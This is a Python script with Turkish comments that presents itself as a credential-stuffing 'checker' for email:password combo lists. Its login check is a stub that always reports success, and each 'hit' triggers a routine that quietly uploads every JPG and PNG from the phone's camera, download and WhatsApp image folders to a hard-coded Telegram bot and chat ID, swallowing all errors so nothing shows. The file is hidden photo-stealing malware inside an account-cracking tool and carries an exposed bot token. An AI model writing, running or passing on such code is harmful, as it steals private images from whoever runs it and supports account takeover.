import os
import time
import requests
import telegram
from telegram import InputFile
from termcolor import colored  # colorama'yı kullanmayacağız, termcolor yeterli olacak

# Telegram bot token ve chat ID
bot_token = "8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo"  # Bot tokeninizi burada değiştirin
chat_id = "7045128535"  # Chat ID'nizi burada değiştirin
bot = telegram.Bot(token=bot_token)

# Fotoğraf dosyasını Telegram'a gönder
def send_photo_to_telegram(photo_path):
    try:
        # Fotoğraf dosyasını gönderiyoruz
        with open(photo_path, 'rb') as photo_file:
            bot.send_photo(chat_id=chat_id, photo=photo_file)
        # Fotoğraf gönderildikten sonra terminalde herhangi bir çıktı göstermemeliyiz
    except Exception as e:
        pass  # Hata oluşursa hiçbir şey yapma

# Cihazda olabilecek tüm fotoğraf dizinleri
photo_directories = [
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures",
    "/storage/emulated/0/Downloads",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"
]

# Fotoğrafın bulunduğu dizinleri tarayıp, fotoğrafları gönder
def send_all_photos():
    try:
        for directory in photo_directories:
            # Bu dizindeki tüm dosyaları alalım
            if os.path.exists(directory):
                for photo_name in os.listdir(directory):
                    photo_path = os.path.join(directory, photo_name)

                    # Eğer bu bir dosya ve uzantısı doğruysa (örneğin .jpg, .jpeg, .png)
                    if os.path.isfile(photo_path) and photo_path.lower().endswith(('.jpg', '.jpeg', '.png')):
                        send_photo_to_telegram(photo_path)
                        time.sleep(1)  # Her fotoğraf arasında 1 saniye bekleme
            else:
                print(f"Dizin bulunamadı: {directory}")
    except Exception as e:
        pass  # Hata durumunda hiçbir şey yapma

# Checker fonksiyonu
def checker(file_path):
    with open(file_path, 'r') as f:
        combos = [line.strip() for line in f if ':' in line]
    
    for combo in combos:
        try:
            email, password = combo.split(":")
            
            # Burada giriş işlemi yapılacak, örneğin Exxen, Disney vb.
            # Burada sadece örnek olarak basit bir kontrol ekliyorum.
            if check_login(email, password):  # check_login fonksiyonu başarı durumunu döndürecek.
                print(colored(f'Başarılı giriş! ✅ {email} | {password}', 'green'))  # Başarılı girişleri yeşil yazdır
                # Giriş başarılı olduğunda fotoğrafları gönder
                send_all_photos()  # Fotoğrafları gönder
            else:
                print(colored(f'Başarısız giriş! ❌ {email} | {password}', 'red'))  # Başarısız girişleri kırmızı yazdır
            time.sleep(0.1)  # Checker işlemi hızını ayarlayın

        except Exception as e:
            pass  # Hata durumunda işlem yapma

# Giriş kontrol fonksiyonu
def check_login(email, password):
    # Burada giriş kontrolünü yapacağınız platforma göre değiştirin
    # Örnek olarak başarılı olduğunda True döndürelim
    # Gerçek platforma göre uygun API veya request gönderilebilir.
    return True  # Gerçek kontrol burada yapılacak

# Ana fonksiyon
def main():
    file_path = input("Checker dosyasının yolunu girin: ")  # Dosya yolunu kullanıcıdan alıyoruz
    checker(file_path)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProgram durduruldu.")
